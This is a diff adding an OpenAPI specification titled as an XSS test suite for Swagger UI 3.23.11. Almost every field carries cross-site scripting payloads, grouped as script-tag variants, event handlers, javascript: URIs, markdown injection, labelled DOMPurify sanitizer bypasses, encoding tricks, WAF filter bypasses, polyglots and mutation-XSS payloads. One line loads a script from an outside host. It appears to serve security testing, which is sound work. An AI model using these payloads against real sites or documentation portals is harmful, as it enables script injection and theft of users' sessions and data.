@@ -1,0 +1,870 @@
+openapi: "3.0.0"
+info:
+  title: "XSS Test Suite — Swagger UI 3.23.11"
+  version: "1.0.0"
+  description: |
+    <script>alert(document.domain)</script>
+    <script>alert(1)</script>
+    <script src="https://xss.rocks/xss.js"></script>
+    <ScRiPt>alert(document.domain)</ScRiPt>
+    <scr<script>ipt>alert(1)</scr</script>ipt>
+    <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+    </script><script>alert(1)</script>
+    '--><script>alert(1)</script>
+    "><script>alert(document.domain)</script>
+    '><script>alert(document.domain)</script>
+
+paths:
+
+  # ============================================================
+  # GROUP 1: Classic Script Tags + Variations
+  # ============================================================
+
+  /g1-script-basic:
+    get:
+      summary: "<script>alert(document.domain)</script>"
+      description: "<script>alert(document.domain)</script>"
+      operationId: g1_script_basic
+      responses:
+        "200":
+          description: "<script>alert(1)</script>"
+
+  /g1-script-case:
+    get:
+      summary: "<ScRiPt>alert(1)</ScRiPt>"
+      description: "<ScRiPt AlErT=1>alert(document.domain)</ScRiPt>"
+      operationId: g1_script_case
+      responses:
+        "200":
+          description: ok
+
+  /g1-script-nested:
+    get:
+      summary: "test"
+      description: "<scr<script>ipt>alert(1)</scr</script>ipt>"
+      operationId: g1_script_nested
+      responses:
+        "200":
+          description: ok
+
+  /g1-script-encoded:
+    get:
+      summary: "test"
+      description: "&#60;script&#62;alert(1)&#60;/script&#62;"
+      operationId: g1_script_encoded
+      responses:
+        "200":
+          description: ok
+
+  /g1-script-null:
+    get:
+      summary: "test"
+      description: "<scri&#0;pt>alert(1)</scri&#0;pt>"
+      operationId: g1_script_null
+      responses:
+        "200":
+          description: ok
+
+  /g1-script-tab:
+    get:
+      summary: "test"
+      description: "<scri	pt>alert(1)</scri	pt>"
+      operationId: g1_script_tab
+      responses:
+        "200":
+          description: ok
+
+  # ============================================================
+  # GROUP 2: Event Handlers on Various Tags
+  # ============================================================
+
+  /g2-img-onerror:
+    get:
+      summary: "test"
+      description: "<img src=x onerror=alert(document.domain)>"
+      operationId: g2_img_onerror
+      responses:
+        "200":
+          description: ok
+
+  /g2-img-onerror-single:
+    get:
+      summary: "test"
+      description: "<img src='x' onerror='alert(document.domain)'>"
+      operationId: g2_img_onerror_single
+      responses:
+        "200":
+          description: ok
+
+  /g2-img-onerror-noquotes:
+    get:
+      summary: "test"
+      description: "<img src=x:x onerror=alert(1)>"
+      operationId: g2_img_onerror_noq
+      responses:
+        "200":
+          description: ok
+
+  /g2-body-onload:
+    get:
+      summary: "test"
+      description: "<body onload=alert(document.domain)>"
+      operationId: g2_body_onload
+      responses:
+        "200":
+          description: ok
+
+  /g2-svg-onload:
+    get:
+      summary: "test"
+      description: "<svg onload=alert(document.domain)>"
+      operationId: g2_svg_onload
+      responses:
+        "200":
+          description: ok
+
+  /g2-svg-slash:
+    get:
+      summary: "test"
+      description: "<svg/onload=alert(document.domain)>"
+      operationId: g2_svg_slash
+      responses:
+        "200":
+          description: ok
+
+  /g2-svg-animate:
+    get:
+      summary: "test"
+      description: "<svg><animate onbegin=alert(document.domain) attributeName=x></svg>"
+      operationId: g2_svg_animate
+      responses:
+        "200":
+          description: ok
+
+  /g2-svg-set:
+    get:
+      summary: "test"
+      description: "<svg><set attributeName=x on='load' to=alert(1)></svg>"
+      operationId: g2_svg_set
+      responses:
+        "200":
+          description: ok
+
+  /g2-details-ontoggle:
+    get:
+      summary: "test"
+      description: "<details open ontoggle=alert(document.domain)>"
+      operationId: g2_details_ontoggle
+      responses:
+        "200":
+          description: ok
+
+  /g2-details-open:
+    get:
+      summary: "test"
+      description: "<details/open/ontoggle=alert(1)>"
+      operationId: g2_details_open
+      responses:
+        "200":
+          description: ok
+
+  /g2-video-onerror:
+    get:
+      summary: "test"
+      description: "<video><source onerror=alert(document.domain)>"
+      operationId: g2_video_onerror
+      responses:
+        "200":
+          description: ok
+
+  /g2-audio-onerror:
+    get:
+      summary: "test"
+      description: "<audio src=x onerror=alert(document.domain)>"
+      operationId: g2_audio_onerror
+      responses:
+        "200":
+          description: ok
+
+  /g2-input-autofocus:
+    get:
+      summary: "test"
+      description: "<input autofocus onfocus=alert(document.domain)>"
+      operationId: g2_input_autofocus
+      responses:
+        "200":
+          description: ok
+
+  /g2-select-autofocus:
+    get:
+      summary: "test"
+      description: "<select autofocus onfocus=alert(1)><option>x</option></select>"
+      operationId: g2_select_autofocus
+      responses:
+        "200":
+          description: ok
+
+  /g2-textarea-autofocus:
+    get:
+      summary: "test"
+      description: "<textarea autofocus onfocus=alert(1)></textarea>"
+      operationId: g2_textarea_autofocus
+      responses:
+        "200":
+          description: ok
+
+  /g2-keygen-autofocus:
+    get:
+      summary: "test"
+      description: "<keygen autofocus onfocus=alert(1)>"
+      operationId: g2_keygen_autofocus
+      responses:
+        "200":
+          description: ok
+
+  /g2-marquee-onstart:
+    get:
+      summary: "test"
+      description: "<marquee onstart=alert(document.domain)>XSS</marquee>"
+      operationId: g2_marquee_onstart
+      responses:
+        "200":
+          description: ok
+
+  /g2-div-onmouseover:
+    get:
+      summary: "test"
+      description: "<div onmouseover=alert(1)>hover me</div>"
+      operationId: g2_div_onmouseover
+      responses:
+        "200":
+          description: ok
+
+  /g2-iframe-onload:
+    get:
+      summary: "test"
+      description: "<iframe onload=alert(document.domain)></iframe>"
+      operationId: g2_iframe_onload
+      responses:
+        "200":
+          description: ok
+
+  /g2-object-data:
+    get:
+      summary: "test"
+      description: "<object data=javascript:alert(1)>"
+      operationId: g2_object_data
+      responses:
+        "200":
+          description: ok
+
+  # ============================================================
+  # GROUP 3: javascript: URI Schemes
+  # ============================================================
+
+  /g3-a-href-js:
+    get:
+      summary: "test"
+      description: '<a href="javascript:alert(document.domain)">click</a>'
+      operationId: g3_a_href_js
+      responses:
+        "200":
+          description: ok
+
+  /g3-a-href-js-encoded:
+    get:
+      summary: "test"
+      description: '<a href="javascript&#58;alert(1)">click</a>'
+      operationId: g3_a_href_js_enc
+      responses:
+        "200":
+          description: ok
+
+  /g3-a-href-js-colon:
+    get:
+      summary: "test"
+      description: '<a href="javascript&colon;alert(1)">click</a>'
+      operationId: g3_a_href_js_colon
+      responses:
+        "200":
+          description: ok
+
+  /g3-a-href-hex:
+    get:
+      summary: "test"
+      description: '<a href="&#106;avascript:alert(1)">click</a>'
+      operationId: g3_a_href_hex
+      responses:
+        "200":
+          description: ok
+
+  /g3-a-href-uppercase:
+    get:
+      summary: "test"
+      description: '<a href="JAVASCRIPT:alert(1)">click</a>'
+      operationId: g3_a_href_upper
+      responses:
+        "200":
+          description: ok
+
+  /g3-a-href-tab:
+    get:
+      summary: "test"
+      description: "<a href=\"java	script:alert(1)\">click</a>"
+      operationId: g3_a_href_tab
+      responses:
+        "200":
+          description: ok
+
+  /g3-a-href-newline:
+    get:
+      summary: "test"
+      description: "<a href=\"java\nscript:alert(1)\">click</a>"
+      operationId: g3_a_href_newline
+      responses:
+        "200":
+          description: ok
+
+  /g3-a-href-vbscript:
+    get:
+      summary: "test"
+      description: '<a href="vbscript:alert(1)">click</a>'
+      operationId: g3_a_href_vbs
+      responses:
+        "200":
+          description: ok
+
+  # ============================================================
+  # GROUP 4: Markdown-based XSS
+  # ============================================================
+
+  /g4-md-link-js:
+    get:
+      summary: "test"
+      description: "[click me](javascript:alert(document.domain))"
+      operationId: g4_md_link_js
+      responses:
+        "200":
+          description: ok
+
+  /g4-md-link-encoded:
+    get:
+      summary: "test"
+      description: "[click](javascript&#58;alert(1))"
+      operationId: g4_md_link_enc
+      responses:
+        "200":
+          description: ok
+
+  /g4-md-img-onerror:
+    get:
+      summary: "test"
+      description: "![x](x)<img src=x onerror=alert(1)>"
+      operationId: g4_md_img_onerror
+      responses:
+        "200":
+          description: ok
+
+  /g4-md-html-mix:
+    get:
+      summary: "test"
+      description: |
+        Normal text here.
+        <svg onload=alert(document.domain)>
+        More text.
+      operationId: g4_md_html_mix
+      responses:
+        "200":
+          description: ok
+
+  /g4-md-code-escape:
+    get:
+      summary: "test"
+      description: "```\n</code><script>alert(1)</script>\n```"
+      operationId: g4_md_code_escape
+      responses:
+        "200":
+          description: ok
+
+  /g4-md-table-inject:
+    get:
+      summary: "test"
+      description: |
+        | Col1 | Col2 |
+        |------|------|
+        | test | <script>alert(1)</script> |
+        | data | <img src=x onerror=alert(document.domain)> |
+      operationId: g4_md_table
+      responses:
+        "200":
+          description: ok
+
+  # ============================================================
+  # GROUP 5: DOMPurify-specific Bypasses
+  # ============================================================
+
+  /g5-dompurify-math:
+    get:
+      summary: "test"
+      description: "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></table></mtext></math>"
+      operationId: g5_dp_math
+      responses:
+        "200":
+          description: ok
+
+  /g5-dompurify-math2:
+    get:
+      summary: "test"
+      description: "<math><mtext><h1><a><mark></mark></a></h1></mtext></math>"
+      operationId: g5_dp_math2
+      responses:
+        "200":
+          description: ok
+
+  /g5-dompurify-svg-foreign:
+    get:
+      summary: "test"
+      description: "<svg><foreignObject><div><iframe src=javascript:alert(document.domain)></iframe></div></foreignObject></svg>"
+      operationId: g5_dp_svg_foreign
+      responses:
+        "200":
+          description: ok
+
+  /g5-dompurify-noscript:
+    get:
+      summary: "test"
+      description: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+      operationId: g5_dp_noscript
+      responses:
+        "200":
+          description: ok
+
+  /g5-dompurify-template:
+    get:
+      summary: "test"
+      description: "<template><img src=x onerror=alert(1)></template>"
+      operationId: g5_dp_template
+      responses:
+        "200":
+          description: ok
+
+  /g5-dompurify-xml-ns:
+    get:
+      summary: "test"
+      description: "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>"
+      operationId: g5_dp_xmlns
+      responses:
+        "200":
+          description: ok
+
+  /g5-dompurify-use:
+    get:
+      summary: "test"
+      description: "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\"></use></svg>"
+      operationId: g5_dp_use
+      responses:
+        "200":
+          description: ok
+
+  /g5-dompurify-style-import:
+    get:
+      summary: "test"
+      description: "<style>@import 'javascript:alert(1)'</style>"
+      operationId: g5_dp_style_import
+      responses:
+        "200":
+          description: ok
+
+  /g5-dompurify-iframe-srcdoc:
+    get:
+      summary: "test"
+      description: "<iframe srcdoc=\"<script>alert(document.domain)</script>\"></iframe>"
+      operationId: g5_dp_srcdoc
+      responses:
+        "200":
+          description: ok
+
+  /g5-dompurify-base64:
+    get:
+      summary: "test"
+      description: "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>"
+      operationId: g5_dp_base64
+      responses:
+        "200":
+          description: ok
+
+  /g5-dompurify-form:
+    get:
+      summary: "test"
+      description: "<form action=javascript:alert(1)><input type=submit value=XSS></form>"
+      operationId: g5_dp_form
+      responses:
+        "200":
+          description: ok
+
+  /g5-dompurify-button:
+    get:
+      summary: "test"
+      description: "<button onclick=alert(document.domain)>click</button>"
+      operationId: g5_dp_button
+      responses:
+        "200":
+          description: ok
+
+  /g5-dompurify-link-rel:
+    get:
+      summary: "test"
+      description: "<link rel=stylesheet href=javascript:alert(1)>"
+      operationId: g5_dp_link
+      responses:
+        "200":
+          description: ok
+
+  # ============================================================
+  # GROUP 6: Encoding + Obfuscation
+  # ============================================================
+
+  /g6-html-entities:
+    get:
+      summary: "test"
+      description: "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;"
+      operationId: g6_html_entities
+      responses:
+        "200":
+          description: ok
+
+  /g6-unicode-escape:
+    get:
+      summary: "test"
+      description: "\u003cscript\u003ealert(1)\u003c/script\u003e"
+      operationId: g6_unicode
+      responses:
+        "200":
+          description: ok
+
+  /g6-double-encode:
+    get:
+      summary: "test"
+      description: "%253Cscript%253Ealert(1)%253C%252Fscript%253E"
+      operationId: g6_double_enc
+      responses:
+        "200":
+          description: ok
+
+  /g6-js-string-concat:
+    get:
+      summary: "test"
+      description: "<img src=x onerror=\"eval('ale'+'rt(1)')\">"
+      operationId: g6_js_concat
+      responses:
+        "200":
+          description: ok
+
+  /g6-js-fromcharcode:
+    get:
+      summary: "test"
+      description: "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"
+      operationId: g6_fromcharcode
+      responses:
+        "200":
+          description: ok
+
+  /g6-js-atob:
+    get:
+      summary: "test"
+      description: "<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>"
+      operationId: g6_atob
+      responses:
+        "200":
+          description: ok
+
+  /g6-js-setTimeout:
+    get:
+      summary: "test"
+      description: "<img src=x onerror=setTimeout('alert(document.domain)',0)>"
+      operationId: g6_settimeout
+      responses:
+        "200":
+          description: ok
+
+  /g6-css-expression:
+    get:
+      summary: "test"
+      description: "<div style=\"width: expression(alert(1))\">test</div>"
+      operationId: g6_css_expr
+      responses:
+        "200":
+          description: ok
+
+  # ============================================================
+  # GROUP 7: WAF / Filter Bypass Techniques
+  # ============================================================
+
+  /g7-space-bypass:
+    get:
+      summary: "test"
+      description: "<img/src=x/onerror=alert(1)>"
+      operationId: g7_space_bypass
+      responses:
+        "200":
+          description: ok
+
+  /g7-newline-bypass:
+    get:
+      summary: "test"
+      description: "<img src=x\nonerror=alert(1)>"
+      operationId: g7_newline_bypass
+      responses:
+        "200":
+          description: ok
+
+  /g7-tab-bypass:
+    get:
+      summary: "test"
+      description: "<img src=x	onerror=alert(1)>"
+      operationId: g7_tab_bypass
+      responses:
+        "200":
+          description: ok
+
+  /g7-null-byte:
+    get:
+      summary: "test"
+      description: "<img src=x onerror=alert&#0;1>"
+      operationId: g7_null_byte
+      responses:
+        "200":
+          description: ok
+
+  /g7-comment-break:
+    get:
+      summary: "test"
+      description: "<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>"
+      operationId: g7_comment
+      responses:
+        "200":
+          description: ok
+
+  /g7-uppercase-attr:
+    get:
+      summary: "test"
+      description: "<IMG SRC=x ONERROR=alert(1)>"
+      operationId: g7_uppercase
+      responses:
+        "200":
+          description: ok
+
+  /g7-mixed-case:
+    get:
+      summary: "test"
+      description: "<ImG sRc=x OnErRoR=alert(document.domain)>"
+      operationId: g7_mixed_case
+      responses:
+        "200":
+          description: ok
+
+  /g7-extra-attrs:
+    get:
+      summary: "test"
+      description: "<img SOMETHING=x src=x onerror=alert(1)>"
+      operationId: g7_extra_attrs
+      responses:
+        "200":
+          description: ok
+
+  /g7-unclosed-tag:
+    get:
+      summary: "test"
+      description: "<img src=x onerror=alert(1) <"
+      operationId: g7_unclosed
+      responses:
+        "200":
+          description: ok
+
+  # ============================================================
+  # GROUP 8: Swagger-UI Specific / operationId / x-fields
+  # ============================================================
+
+  /g8-operationid-xss:
+    get:
+      summary: "test"
+      description: "test"
+      operationId: "</script><script>alert(document.domain)</script>"
+      responses:
+        "200":
+          description: ok
+
+  /g8-tag-name-xss:
+    get:
+      summary: "test"
+      description: "test"
+      operationId: g8_tag
+      tags:
+        - "<script>alert(1)</script>"
+        - "<img src=x onerror=alert(document.domain)>"
+      responses:
+        "200":
+          description: ok
+
+  /g8-server-url-xss:
+    get:
+      summary: "test"
+      description: "test"
+      operationId: g8_server
+      responses:
+        "200":
+          description: ok
+
+  /g8-param-name-xss:
+    get:
+      summary: "test"
+      description: "test"
+      operationId: g8_param
+      parameters:
+        - name: "<img src=x onerror=alert(1)>"
+          in: query
+          schema:
+            type: string
+        - name: "normal_param"
+          in: query
+          description: "<svg onload=alert(document.domain)>"
+          schema:
+            type: string
+      responses:
+        "200":
+          description: ok
+
+  /g8-response-desc-xss:
+    get:
+      summary: "test"
+      description: "test"
+      operationId: g8_resp
+      responses:
+        "200":
+          description: "<script>alert(document.domain)</script>"
+        "404":
+          description: "<img src=x onerror=alert(1)>"
+        "500":
+          description: "<svg onload=alert(1)>"
+
+  /g8-example-value-xss:
+    get:
+      summary: "test"
+      description: "test"
+      operationId: g8_example
+      parameters:
+        - name: id
+          in: query
+          example: "<script>alert(1)</script>"
+          schema:
+            type: string
+            example: "<img src=x onerror=alert(document.domain)>"
+      responses:
+        "200":
+          description: ok
+          content:
+            application/json:
+              example:
+                key: "<script>alert(1)</script>"
+                value: "<img src=x onerror=alert(1)>"
+
+  /g8-schema-title-xss:
+    get:
+      summary: "test"
+      description: "test"
+      operationId: g8_schema
+      responses:
+        "200":
+          description: ok
+          content:
+            application/json:
+              schema:
+                title: "<script>alert(document.domain)</script>"
+                description: "<img src=x onerror=alert(1)>"
+                type: object
+                properties:
+                  id:
+                    type: integer
+                    description: "<svg onload=alert(1)>"
+
+  # ============================================================
+  # GROUP 9: x-extensions (Swagger custom fields)
+  # ============================================================
+
+  /g9-x-extension:
+    get:
+      summary: "test"
+      description: "test"
+      operationId: g9_ext
+      x-custom: "<script>alert(1)</script>"
+      x-description: "<img src=x onerror=alert(document.domain)>"
+      responses:
+        "200":
+          description: ok
+
+  # ============================================================
+  # GROUP 10: Polyglot / Universal Payloads
+  # ============================================================
+
+  /g10-polyglot-1:
+    get:
+      summary: "test"
+      description: "javascript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert()//>>"
+      operationId: g10_poly1
+      responses:
+        "200":
+          description: ok
+
+  /g10-polyglot-2:
+    get:
+      summary: "test"
+      description: "\";alert(document.domain)//\""
+      operationId: g10_poly2
+      responses:
+        "200":
+          description: ok
+
+  /g10-polyglot-3:
+    get:
+      summary: "test"
+      description: "'\"--></style></script><script>alert(document.domain)</script>"
+      operationId: g10_poly3
+      responses:
+        "200":
+          description: ok
+
+  /g10-polyglot-4:
+    get:
+      summary: "test"
+      description: "<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;&#41;>"
+      operationId: g10_poly4
+      responses:
+        "200":
+          description: ok
+
+  /g10-mxss-1:
+    get:
+      summary: "test"
+      description: "<listing><img src=x onerror=alert(1)></listing>"
+      operationId: g10_mxss1
+      responses:
+        "200":
+          description: ok
+
+  /g10-mxss-2:
+    get:
+      summary: "test"
+      description: "<xmp><img src=x onerror=alert(1)></xmp>"
+      operationId: g10_mxss2
+      responses:
+        "200":
+          description: ok
+
+  /g10-mxss-3:
+    get:
+      summary: "test"
+      description: "<plaintext><img src=x onerror=alert(1)>"
+      operationId: g10_mxss3
+      responses:
+        "200":
+          description: ok
